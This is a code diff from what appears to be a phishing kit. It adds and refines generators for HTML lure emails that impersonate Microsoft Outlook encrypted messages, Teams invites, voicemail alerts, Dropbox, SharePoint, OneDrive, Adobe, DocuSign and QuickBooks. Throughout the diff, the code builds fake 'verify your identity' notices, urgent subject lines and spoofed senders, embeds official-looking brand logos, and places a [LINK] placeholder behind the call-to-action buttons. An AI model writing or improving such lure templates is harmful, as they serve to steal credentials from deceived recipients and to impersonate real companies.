@@ -11390,7 +11390,7 @@ Delegated     : ${inboxesDesc}
                 .replace(/\[COMPANY\]/g, cleanCompany)
                 .replace(/\[LINK\]/g, firstLink);
 
-            iframe.srcdoc = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{margin:0;padding:12px;background:#f7f9fa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;} *{max-width:100%!important;box-sizing:border-box!important;} img{max-width:100%!important;height:auto!important;} table{max-width:100%!important;width:100%!important;} .email-card{max-width:560px!important;width:100%!important;margin:0 auto!important;}</style></head><body>${rendered}</body></html>`;
+            iframe.srcdoc = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{margin:0;padding:18px 12px;background:#f4f6f8;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;} .b2b-card-outer{margin:0 auto!important;} img{max-width:100%;object-fit:contain;} table{border-collapse:separate;} a{text-decoration:none;}</style></head><body>${rendered}</body></html>`;
             setTimeout(autoResizePreviewFrame, 120);
         }
 
@@ -11704,7 +11704,17 @@ Delegated     : ${inboxesDesc}
             let foot1 = 'End-to-end encrypted notification for [COMPANY]', foot2 = 'Secure Communications System';
             let headerLogo = '<div style="font-size:26px;margin-bottom:6px;">🔒</div><div style="font-size:16px;font-weight:700;color:#0f172a;">Secure Document Portal</div>';
 
-            if (b.includes('dropbox')) {
+            if (b.includes('outlook') || b.includes('encrypted') || b.includes('ome') || b.includes('office') || b.includes('m365') || b.includes('microsoft')) {
+                accent = '#0078D4'; badge = 'OME'; badgeBg = '#0078D4';
+                title = 'Encrypted Message Received';
+                desc = 'You have received an encrypted message from your organization. Complete identity verification to decrypt and read this message.';
+                docName = 'Confidential Organization Notice';
+                docSub = 'Microsoft Purview · TLS 1.3 Message Encryption';
+                btnLabel = 'Read Encrypted Message'; btnRadius = '4px';
+                foot1 = 'Protected by Microsoft Outlook Message Encryption (OME)';
+                foot2 = 'Exchange Online Information Protection · End-to-end encrypted';
+                headerLogo = '<div style="font-size:26px;margin-bottom:4px;">✉️</div><div style="font-size:17px;font-weight:700;color:#0078D4;">Microsoft Outlook</div>';
+            } else if (b.includes('dropbox')) {
                 accent = '#0061FF'; badge = 'PDF'; badgeBg = '#0061FF';
                 title = 'Dropbox File Shared';
                 desc = 'A confidential document has been shared with you via Dropbox. Verify your identity to access.';
@@ -11766,7 +11776,9 @@ Delegated     : ${inboxesDesc}
                 headerLogo = '<div style="font-size:26px;margin-bottom:4px;">💳</div><div style="font-size:17px;font-weight:800;color:#2CB34A;">Intuit QuickBooks</div>';
             }
 
-            const subjects = b.includes('dropbox') ? `[NAME], shared "Proposal-v2.pptx" with you on Dropbox\n[NAME], a file has been shared with you via Dropbox\nAction Required: View shared file on Dropbox` :
+            const subjects = (b.includes('outlook') || b.includes('encrypted') || b.includes('ome') || b.includes('office') || b.includes('m365') || b.includes('microsoft')) ?
+                             `[NAME], Important update regarding your Microsoft 365 access\nAction Required: Read encrypted message from organization\n[COMPANY] Security Notice: Review organizational message` :
+                             b.includes('dropbox') ? `[NAME], shared "Proposal-v2.pptx" with you on Dropbox\n[NAME], a file has been shared with you via Dropbox\nAction Required: View shared file on Dropbox` :
                              b.includes('onedrive') ? `[NAME] shared a secure document with you on OneDrive\n[NAME], Important OneDrive shared file: Action Required\nReview requested: Protected document via OneDrive` :
                              b.includes('sharepoint') ? `[NAME], Review requested: SharePoint Document\n[NAME], You have received a new document in SharePoint\nShared File: SharePoint Document for [COMPANY]` :
                              b.includes('adobe') ? `[NAME], Please sign: Agreement pending your signature\nAdobe Acrobat: Signature requested on document\nAction Required: Document ready for review` :
@@ -16056,25 +16068,43 @@ def _b2b_suggested_subjects(brand, dep_name=''):
         )
 
 
-def _get_b2b_email_logo(brand, max_h=30):
-    """Return a lightweight, email-safe brand logo header using official CDN assets instead of heavy base64 blobs."""
+def _get_b2b_email_logo(brand, max_h=32):
+    """Return an email-safe brand logo header using crisp base64 PNG data from assets.py."""
+    import assets
     b = (brand or '').lower()
-    logos = {
-        'dropbox': ('https://cfl.dropboxstatic.com/static/images/brand/dropbox-logo_vector_stroke.svg', 'Dropbox', 26),
-        'sharepoint': ('https://res.cdn.office.net/files/fabric-cdn-prod_20240129.001/assets/brand-icons/product/svg/sharepoint_32x1.svg', 'SharePoint', 28),
-        'onedrive': ('https://res.cdn.office.net/files/fabric-cdn-prod_20240129.001/assets/brand-icons/product/svg/onedrive_32x1.svg', 'OneDrive', 28),
-        'adobe': ('https://www.adobe.com/content/dam/cc/icons/Adobe_Corporate_Horizontal_Red_HEX.svg', 'Adobe Acrobat', 26),
-        'docusign': ('https://docucdn-a.akamaihd.net/corporate/3.54.0/img/logo.svg', 'DocuSign', 24),
-        'quickbooks': ('https://quickbooks.intuit.com/cas/dam/INVENTORY/QuickBooks-Logo.svg', 'QuickBooks', 24),
-        'microsoft': ('https://res.cdn.office.net/files/fabric-cdn-prod_20240129.001/assets/brand-icons/product/svg/msft_32x1.svg', 'Microsoft 365', 26),
-    }
-    for k, (url, alt, h) in logos.items():
-        if k in b:
-            return f'<table role="presentation" border="0" cellpadding="0" cellspacing="0" align="center" style="margin:0 auto 12px;"><tr><td align="center" valign="middle"><img src="{url}" alt="{alt}" height="{h}" border="0" style="height:{h}px;max-height:{h}px;border:0;outline:none;text-decoration:none;display:block;margin:0 auto;" /></td></tr></table>'
 
-    # Fallback to Microsoft 365
-    url, alt, h = logos['microsoft']
-    return f'<table role="presentation" border="0" cellpadding="0" cellspacing="0" align="center" style="margin:0 auto 12px;"><tr><td align="center" valign="middle"><img src="{url}" alt="{alt}" height="{h}" border="0" style="height:{h}px;max-height:{h}px;border:0;outline:none;text-decoration:none;display:block;margin:0 auto;" /></td></tr></table>'
+    if 'outlook' in b or 'encrypted' in b or 'ome' in b:
+        key = 'Outlook'
+    elif 'sharepoint' in b:
+        key = 'SharePoint'
+    elif 'onedrive' in b:
+        key = 'OneDrive'
+    elif 'adobe' in b:
+        key = 'Adobe'
+    elif 'docusign' in b:
+        key = 'DocuSign'
+    elif 'quickbooks' in b:
+        key = 'QuickBooks'
+    elif 'dropbox' in b:
+        key = 'Dropbox'
+    elif 'teams' in b:
+        key = 'Microsoft Teams'
+    elif 'voicemail' in b:
+        key = 'Cloud Voicemail'
+    elif 'microsoft' in b or 'm365' in b or 'office' in b:
+        key = 'Microsoft 365'
+    else:
+        key = 'Microsoft 365'
+
+    logo_data = assets.get_logo_data_url(key)
+    if not logo_data:
+        logo_data = assets.get_logo_data_url('Microsoft 365')
+        key = 'Microsoft 365'
+
+    if not logo_data:
+        return ''
+
+    return f'<table role="presentation" border="0" cellpadding="0" cellspacing="0" align="center" style="margin:0 auto 14px;border-collapse:collapse;"><tr><td align="center" valign="middle"><img src="{logo_data}" alt="{key}" height="{max_h}" border="0" style="height:{max_h}px;max-height:{max_h}px;border:0;outline:none;text-decoration:none;display:block;margin:0 auto;" /></td></tr></table>'
 
 
 def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
@@ -16082,7 +16112,103 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
     cfg = cfg or {}
     b = (brand or '').lower()
 
-    if 'dropbox' in b:
+    if 'outlook' in b or 'encrypted' in b or 'ome' in b:
+        accent = '#0078D4'
+        title = cfg.get('title', 'Encrypted Message Received')
+        desc = cfg.get('description', 'You have received an encrypted message from your organization. Complete identity verification to decrypt and read this message.')
+        sender = cfg.get('outlook_sender', cfg.get('sender_name', 'Security Compliance Center &lt;compliance@organization.com&gt;'))
+        subject = cfg.get('outlook_subject', cfg.get('email_subject', 'Confidential Organization Notice'))
+        meta_info = cfg.get('outlook_meta', 'TLS 1.3 Protected · Microsoft Purview Message Encryption')
+        btn_label = cfg.get('button_label', 'Read Encrypted Message')
+        foot1 = cfg.get('footer_caption', 'Protected by Microsoft Outlook Message Encryption (OME)')
+        foot2 = cfg.get('footer_text', 'Exchange Online Information Protection · End-to-end encrypted')
+        border = '#e2e8f0'
+        btn_radius = '4px'
+        logo = _get_b2b_email_logo('outlook', 34)
+
+        middle_html = f'''<table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;margin:0 0 16px;border-collapse:separate;text-align:left;">
+          <tr>
+            <td style="padding:10px 14px;border-bottom:1px solid #edf2f7;">
+              <div style="font-size:10px;font-weight:700;color:#64748b;letter-spacing:0.5px;text-transform:uppercase;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">FROM / SENDER</div>
+              <div style="font-size:12.5px;font-weight:600;color:#1e293b;margin-top:2px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{sender}</div>
+            </td>
+          </tr>
+          <tr>
+            <td style="padding:10px 14px;border-bottom:1px solid #edf2f7;">
+              <div style="font-size:10px;font-weight:700;color:#64748b;letter-spacing:0.5px;text-transform:uppercase;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">SUBJECT</div>
+              <div style="font-size:12.5px;font-weight:600;color:#0078D4;margin-top:2px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{subject}</div>
+            </td>
+          </tr>
+          <tr>
+            <td style="padding:8px 14px;background:#f1f5f9;border-radius:0 0 8px 8px;">
+              <div style="font-size:11px;color:#475569;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">&#128274; {meta_info}</div>
+            </td>
+          </tr>
+        </table>'''
+
+    elif 'teams' in b:
+        accent = '#5B5FC7'
+        title = cfg.get('title', 'Join Microsoft Teams Meeting')
+        desc = cfg.get('description', 'You have been invited to join a secured Microsoft Teams video & audio meeting room.')
+        organizer = cfg.get('teams_organizer', 'Organization Administrator')
+        topic = cfg.get('teams_topic', 'Executive Strategy & Review')
+        time_info = cfg.get('teams_time', 'Today · Scheduled 45 mins')
+        btn_label = cfg.get('button_label', 'Join Teams Meeting')
+        foot1 = cfg.get('footer_caption', 'Protected by Microsoft Teams enterprise security policies')
+        foot2 = cfg.get('footer_text', 'End-to-end encrypted transmission')
+        border = '#e2e8f0'
+        btn_radius = '4px'
+        logo = _get_b2b_email_logo('teams', 34)
+
+        middle_html = f'''<table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;margin:0 0 16px;border-collapse:separate;text-align:left;">
+          <tr>
+            <td style="padding:10px 14px;border-bottom:1px solid #edf2f7;">
+              <div style="font-size:10px;font-weight:700;color:#64748b;letter-spacing:0.5px;text-transform:uppercase;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">ORGANIZER</div>
+              <div style="font-size:12.5px;font-weight:600;color:#1e293b;margin-top:2px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{organizer}</div>
+            </td>
+          </tr>
+          <tr>
+            <td style="padding:10px 14px;border-bottom:1px solid #edf2f7;">
+              <div style="font-size:10px;font-weight:700;color:#64748b;letter-spacing:0.5px;text-transform:uppercase;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">MEETING TOPIC</div>
+              <div style="font-size:12.5px;font-weight:600;color:#5B5FC7;margin-top:2px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{topic}</div>
+            </td>
+          </tr>
+          <tr>
+            <td style="padding:8px 14px;background:#f1f5f9;border-radius:0 0 8px 8px;">
+              <div style="font-size:11px;color:#475569;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">&#128197; {time_info}</div>
+            </td>
+          </tr>
+        </table>'''
+
+    elif 'voicemail' in b:
+        accent = '#0078D4'
+        title = cfg.get('title', 'New Encrypted Voicemail (0:48)')
+        desc = cfg.get('description', 'You have received an encrypted voice message. Complete identity verification to listen.')
+        caller = cfg.get('vm_caller', '+1 (800) 419-7250 / Corporate Partner')
+        duration = cfg.get('vm_duration', '0:48')
+        time_info = cfg.get('vm_time', 'Today (Recent)')
+        btn_label = cfg.get('button_label', '&#9654; Play Encrypted Voicemail')
+        foot1 = cfg.get('footer_caption', 'Encrypted via Microsoft 365 Cloud Voicemail')
+        foot2 = cfg.get('footer_text', 'Protected voice transmission · Exchange Online')
+        border = '#e2e8f0'
+        btn_radius = '4px'
+        logo = _get_b2b_email_logo('voicemail', 34)
+
+        middle_html = f'''<table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;margin:0 0 16px;border-collapse:separate;text-align:left;">
+          <tr>
+            <td style="padding:10px 14px;border-bottom:1px solid #edf2f7;">
+              <div style="font-size:10px;font-weight:700;color:#64748b;letter-spacing:0.5px;text-transform:uppercase;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">CALLER</div>
+              <div style="font-size:12.5px;font-weight:600;color:#1e293b;margin-top:2px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{caller}</div>
+            </td>
+          </tr>
+          <tr>
+            <td style="padding:8px 14px;background:#f1f5f9;border-radius:0 0 8px 8px;">
+              <div style="font-size:11px;color:#475569;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">&#9654; Duration: {duration} · Received: {time_info}</div>
+            </td>
+          </tr>
+        </table>'''
+
+    elif 'dropbox' in b:
         accent = '#0061FF'
         badge = cfg.get('doc_badge', 'PDF')
         title = cfg.get('title', 'Dropbox File Shared')
@@ -16094,7 +16220,20 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
         foot2 = cfg.get('footer_text', 'Dropbox, Inc. · Secure Cloud Storage')
         border = '#e2e8f0'
         btn_radius = '6px'
-        logo = _get_b2b_email_logo('dropbox')
+        logo = _get_b2b_email_logo('dropbox', 30)
+        badge_text = '#ffffff'
+        middle_html = f'''<table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:7px;margin:0 0 16px;border-collapse:separate;table-layout:fixed;">
+          <tr>
+            <td width="48" valign="middle" align="center" style="padding:10px 0 10px 12px;width:48px;">
+              <span style="display:inline-block;background:{accent};color:{badge_text};font-size:10.5px;font-weight:700;padding:3px 6px;border-radius:4px;letter-spacing:0.4px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{badge}</span>
+            </td>
+            <td valign="middle" align="left" style="padding:10px 12px 10px 10px;">
+              <div style="font-size:13px;font-weight:600;color:#1e293b;line-height:1.3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{doc_name}</div>
+              <div style="font-size:11px;color:#94a3b8;margin-top:2px;line-height:1.2;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{doc_sub}</div>
+            </td>
+          </tr>
+        </table>'''
+
     elif 'sharepoint' in b:
         accent = '#038387'
         badge = cfg.get('doc_badge', 'PDF')
@@ -16107,7 +16246,20 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
         foot2 = cfg.get('footer_text', 'Microsoft Corporation · Secure Transmission')
         border = '#e2e8f0'
         btn_radius = '4px'
-        logo = _get_b2b_email_logo('sharepoint')
+        logo = _get_b2b_email_logo('sharepoint', 32)
+        badge_text = '#ffffff'
+        middle_html = f'''<table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:7px;margin:0 0 16px;border-collapse:separate;table-layout:fixed;">
+          <tr>
+            <td width="48" valign="middle" align="center" style="padding:10px 0 10px 12px;width:48px;">
+              <span style="display:inline-block;background:{accent};color:{badge_text};font-size:10.5px;font-weight:700;padding:3px 6px;border-radius:4px;letter-spacing:0.4px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{badge}</span>
+            </td>
+            <td valign="middle" align="left" style="padding:10px 12px 10px 10px;">
+              <div style="font-size:13px;font-weight:600;color:#1e293b;line-height:1.3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{doc_name}</div>
+              <div style="font-size:11px;color:#94a3b8;margin-top:2px;line-height:1.2;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{doc_sub}</div>
+            </td>
+          </tr>
+        </table>'''
+
     elif 'onedrive' in b:
         accent = '#0078D4'
         badge = cfg.get('doc_badge', 'DOCX')
@@ -16120,7 +16272,20 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
         foot2 = cfg.get('footer_text', 'Microsoft Corporation · One Microsoft Way, Redmond, WA')
         border = '#e2e8f0'
         btn_radius = '4px'
-        logo = _get_b2b_email_logo('onedrive')
+        logo = _get_b2b_email_logo('onedrive', 32)
+        badge_text = '#ffffff'
+        middle_html = f'''<table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:7px;margin:0 0 16px;border-collapse:separate;table-layout:fixed;">
+          <tr>
+            <td width="48" valign="middle" align="center" style="padding:10px 0 10px 12px;width:48px;">
+              <span style="display:inline-block;background:{accent};color:{badge_text};font-size:10.5px;font-weight:700;padding:3px 6px;border-radius:4px;letter-spacing:0.4px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{badge}</span>
+            </td>
+            <td valign="middle" align="left" style="padding:10px 12px 10px 10px;">
+              <div style="font-size:13px;font-weight:600;color:#1e293b;line-height:1.3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{doc_name}</div>
+              <div style="font-size:11px;color:#94a3b8;margin-top:2px;line-height:1.2;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{doc_sub}</div>
+            </td>
+          </tr>
+        </table>'''
+
     elif 'adobe' in b:
         accent = '#FA0F00'
         badge = cfg.get('doc_badge', 'PDF')
@@ -16133,7 +16298,20 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
         foot2 = cfg.get('footer_text', 'Adobe Systems Software Ireland Limited')
         border = '#e5e7eb'
         btn_radius = '20px'
-        logo = _get_b2b_email_logo('adobe')
+        logo = _get_b2b_email_logo('adobe', 32)
+        badge_text = '#ffffff'
+        middle_html = f'''<table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:7px;margin:0 0 16px;border-collapse:separate;table-layout:fixed;">
+          <tr>
+            <td width="48" valign="middle" align="center" style="padding:10px 0 10px 12px;width:48px;">
+              <span style="display:inline-block;background:{accent};color:{badge_text};font-size:10.5px;font-weight:700;padding:3px 6px;border-radius:4px;letter-spacing:0.4px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{badge}</span>
+            </td>
+            <td valign="middle" align="left" style="padding:10px 12px 10px 10px;">
+              <div style="font-size:13px;font-weight:600;color:#1e293b;line-height:1.3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{doc_name}</div>
+              <div style="font-size:11px;color:#94a3b8;margin-top:2px;line-height:1.2;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{doc_sub}</div>
+            </td>
+          </tr>
+        </table>'''
+
     elif 'docusign' in b:
         accent = '#FFCE00'
         badge = cfg.get('doc_badge', 'DOC')
@@ -16146,7 +16324,20 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
         foot2 = cfg.get('footer_text', 'DocuSign, Inc. · Electronic Record and Signature Disclosure')
         border = '#e5e7eb'
         btn_radius = '4px'
-        logo = _get_b2b_email_logo('docusign')
+        logo = _get_b2b_email_logo('docusign', 30)
+        badge_text = '#111111'
+        middle_html = f'''<table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:7px;margin:0 0 16px;border-collapse:separate;table-layout:fixed;">
+          <tr>
+            <td width="48" valign="middle" align="center" style="padding:10px 0 10px 12px;width:48px;">
+              <span style="display:inline-block;background:{accent};color:{badge_text};font-size:10.5px;font-weight:700;padding:3px 6px;border-radius:4px;letter-spacing:0.4px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{badge}</span>
+            </td>
+            <td valign="middle" align="left" style="padding:10px 12px 10px 10px;">
+              <div style="font-size:13px;font-weight:600;color:#1e293b;line-height:1.3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{doc_name}</div>
+              <div style="font-size:11px;color:#94a3b8;margin-top:2px;line-height:1.2;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{doc_sub}</div>
+            </td>
+          </tr>
+        </table>'''
+
     elif 'quickbooks' in b:
         accent = '#2CB34A'
         badge = cfg.get('doc_badge', 'INV')
@@ -16159,7 +16350,20 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
         foot2 = cfg.get('footer_text', 'Intuit Inc. · All rights reserved')
         border = '#e5e7eb'
         btn_radius = '4px'
-        logo = _get_b2b_email_logo('quickbooks')
+        logo = _get_b2b_email_logo('quickbooks', 30)
+        badge_text = '#ffffff'
+        middle_html = f'''<table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:7px;margin:0 0 16px;border-collapse:separate;table-layout:fixed;">
+          <tr>
+            <td width="48" valign="middle" align="center" style="padding:10px 0 10px 12px;width:48px;">
+              <span style="display:inline-block;background:{accent};color:{badge_text};font-size:10.5px;font-weight:700;padding:3px 6px;border-radius:4px;letter-spacing:0.4px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{badge}</span>
+            </td>
+            <td valign="middle" align="left" style="padding:10px 12px 10px 10px;">
+              <div style="font-size:13px;font-weight:600;color:#1e293b;line-height:1.3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{doc_name}</div>
+              <div style="font-size:11px;color:#94a3b8;margin-top:2px;line-height:1.2;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{doc_sub}</div>
+            </td>
+          </tr>
+        </table>'''
+
     else:
         accent = '#0078D4'
         badge = cfg.get('doc_badge', 'FILE')
@@ -16172,16 +16376,27 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
         foot2 = cfg.get('footer_text', 'Secure Communications System')
         border = '#e2e8f0'
         btn_radius = '6px'
-        logo = _get_b2b_email_logo('microsoft')
+        logo = _get_b2b_email_logo('microsoft', 34)
+        badge_text = '#ffffff'
+        middle_html = f'''<table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:7px;margin:0 0 16px;border-collapse:separate;table-layout:fixed;">
+          <tr>
+            <td width="48" valign="middle" align="center" style="padding:10px 0 10px 12px;width:48px;">
+              <span style="display:inline-block;background:{accent};color:{badge_text};font-size:10.5px;font-weight:700;padding:3px 6px;border-radius:4px;letter-spacing:0.4px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{badge}</span>
+            </td>
+            <td valign="middle" align="left" style="padding:10px 12px 10px 10px;">
+              <div style="font-size:13px;font-weight:600;color:#1e293b;line-height:1.3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{doc_name}</div>
+              <div style="font-size:11px;color:#94a3b8;margin-top:2px;line-height:1.2;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">{doc_sub}</div>
+            </td>
+          </tr>
+        </table>'''
 
-    badge_text = '#111111' if accent == '#FFCE00' else '#ffffff'
     btn_text = '#111111' if accent == '#FFCE00' else '#ffffff'
 
     # 100% Email Client Compliant HTML (Gmail, Outlook Desktop & Web, Apple Mail, Yahoo)
-    return f'''<div class="b2b-card-outer" style="max-width:380px;width:100%;margin:12px auto;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#1e293b;">
+    return f'''<div class="b2b-card-outer" style="max-width:440px;width:100%;margin:12px auto;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#1e293b;">
   <p style="margin:0 0 12px;font-size:14px;color:#1e293b;line-height:1.5;">Hello [NAME],</p>
 
-  <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width:380px;background:#ffffff;border:1px solid {border};border-radius:12px;border-collapse:separate;box-shadow:0 4px 18px rgba(0,0,0,0.06);margin:0 auto;text-align:center;">
+  <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width:440px;background:#ffffff;border:1px solid {border};border-radius:12px;border-collapse:separate;box-shadow:0 4px 18px rgba(0,0,0,0.06);margin:0 auto;text-align:center;">
     <tr>
       <td style="padding:22px 20px 18px;text-align:center;">
 
@@ -16192,18 +16407,8 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
         <h2 style="font-size:17px;font-weight:700;color:#0f172a;margin:0 0 6px;line-height:1.3;letter-spacing:-0.2px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">{title}</h2>
         <p style="font-size:13px;color:#64748b;margin:0 0 16px;line-height:1.45;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">{desc}</p>
 
-        <!-- Document Badge Row (Table-based: Cross-client reliable) -->
-        <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:7px;margin:0 0 16px;border-collapse:separate;table-layout:fixed;">
-          <tr>
-            <td width="48" valign="middle" align="center" style="padding:10px 0 10px 12px;width:48px;">
-              <span style="display:inline-block;background:{accent};color:{badge_text};font-size:10.5px;font-weight:700;padding:3px 6px;border-radius:4px;letter-spacing:0.4px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">{badge}</span>
-            </td>
-            <td valign="middle" align="left" style="padding:10px 12px 10px 10px;">
-              <div style="font-size:13px;font-weight:600;color:#1e293b;line-height:1.3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">{doc_name}</div>
-              <div style="font-size:11px;color:#94a3b8;margin-top:2px;line-height:1.2;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">{doc_sub}</div>
-            </td>
-          </tr>
-        </table>
+        <!-- Middle Content Row -->
+        {middle_html}
 
         <!-- CTA Button (Bulletproof Table-Based Email Button) -->
         <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
